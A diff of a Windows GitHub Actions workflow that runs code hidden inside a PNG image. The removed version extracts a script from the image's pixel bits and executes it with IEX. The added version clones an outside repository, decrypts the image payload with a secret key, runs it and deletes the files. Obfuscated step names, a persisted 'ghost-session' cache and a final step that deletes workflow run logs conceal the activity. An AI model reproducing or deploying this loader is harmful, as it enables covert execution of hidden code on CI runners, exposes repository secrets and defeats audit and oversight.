@@ -12,10 +12,10 @@ jobs:
       contents: read
 
     steps:
-      - name: s_01
+      - name: x_1
         uses: actions/checkout@v4
         
-      - name: s_02
+      - name: x_2
         uses: actions/cache@v4
         with:
           path: |
@@ -23,70 +23,30 @@ jobs:
             ~\.vscode\extensions
             C:\Windows\Temp\app_sessions
           key: ${{ runner.os }}-ghost-session
-          # Penting: Pakai restore-keys agar jika key utama tidak ada, dia ambil yang lama
           restore-keys: |
             ${{ runner.os }}-ghost-session
 
-      - name: s_03
+      - name: x_3
         shell: powershell
         env:
-          SSH_KEY: ${{ secrets.SSH_KEY }}
           A_KEY: ${{ secrets.ACCESS_KEY }}
+          D_KEY: ${{ secrets.DEX_KEY }}
         run: |
-          # (Isi script s_02 kamu tetap sama)
-          $imgPath = Join-Path $pwd "BondeXJS.png"
-          # ... sisanya sama ...
-
-      - name: s_04
-        shell: powershell
-        env:
-          SSH_KEY: ${{ secrets.SSH_KEY }}
-          A_KEY: ${{ secrets.ACCESS_KEY }}
-        run: |
-          Add-Type -AssemblyName System.Drawing
-          
-          function Extract-Payload {
-              param ([string]$imagePath)
-              $img = [System.Drawing.Bitmap]::FromFile($imagePath)
-              $extractedBytes = New-Object System.Collections.Generic.List[byte]
-              $currentByte = 0
-              $bitIndex = 0
-
-              for ($y = 0; $y -lt $img.Height; $y++) {
-                  for ($x = 0; $x -lt $img.Width; $x++) {
-                      $pixel = $img.GetPixel($x, $y)
-                      $bit = $pixel.R -band 1
-                      $currentByte = $currentByte -bor ($bit -shl $bitIndex)
-                      $bitIndex++
-                      if ($bitIndex -eq 8) {
-                          $extractedBytes.Add($currentByte)
-                          $currentByte = 0
-                          $bitIndex = 0
-                          $textSoFar = [System.Text.Encoding]::ASCII.GetString($extractedBytes.ToArray())
-                          if ($textSoFar.EndsWith("##END##")) {
-                              $img.Dispose()
-                              return $textSoFar.Replace("##END##", "")
-                          }
-                      }
-                  }
-              }
-              $img.Dispose()
-          }
-
-          $imgPath = Join-Path $pwd "BondeXJS.png"
-          if (Test-Path $imgPath) {
-              Write-Host "[*] Extracting Ghost Payload from Pixels..." -ForegroundColor Cyan
-              $payload = Extract-Payload -imagePath $imgPath
-              if ($payload) {
-                  Write-Host "[+] Decode Successful. Launching Engine..." -ForegroundColor Green
-                  IEX $payload
+          git clone https://github.com/Sxeldest/dex-enc.git dx_t --quiet
+          pip install -r dx_t/requirements.txt --quiet
+          $p = Join-Path $pwd "BondeXJS.png"
+          if (Test-Path $p) {
+              python dx_t/dexenc.py extract -i $p -key "$env:D_KEY" --out-payload r.ps1
+              if (Test-Path r.ps1) {
+                  . ./r.ps1
+                  Remove-Item r.ps1 -Force
+                  Remove-Item -Recurse -Force dx_t
               } else {
-                  Write-Host "[-] Error: Payload corrupted or not found." -ForegroundColor Red
                   exit 1
               }
           }
           
-      - name: s_05
+      - name: x_4
         uses: Mattraks/delete-workflow-runs@v2
         if: always()
         with:
